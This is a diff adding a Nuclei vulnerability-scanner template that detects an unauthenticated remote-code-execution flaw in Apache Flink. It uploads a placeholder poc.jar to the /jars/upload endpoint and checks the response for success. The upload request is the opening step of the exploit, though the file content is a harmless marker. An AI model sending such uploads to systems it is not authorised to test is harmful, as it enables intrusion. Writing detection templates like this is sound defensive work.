@@ -1,0 +1,36 @@
+id: apache-flink-unauth-rce
+info:
+  author: pikpikcu
+  name: Apache Flink Unauth RCE
+  reference: '- https://www.exploit-db.com/exploits/48978
+
+    - https://adamc95.medium.com/apache-flink-1-9-x-part-1-set-up-5d85fd2770f3
+
+    - https://github.com/LandGrey/flink-unauth-rce
+
+    '
+  severity: critical
+  tags: apache,flink,rce
+requests:
+- matchers:
+  - condition: and
+    part: header
+    type: word
+    words:
+    - application/json
+  - condition: and
+    part: body
+    type: word
+    words:
+    - success
+    - _poc.jar
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - "POST /jars/upload HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows\
+    \ NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nContent-Length: 187\nContent-Type:\
+    \ multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3\n\n--8ce4b16b22b58894aa86c421e8759df3\n\
+    Content-Disposition: form-data; name=\"jarfile\";filename=\"poc.jar\"\nContent-Type:application/octet-stream\n\
+    \n  nuclei\n--8ce4b16b22b58894aa86c421e8759df3--\n"
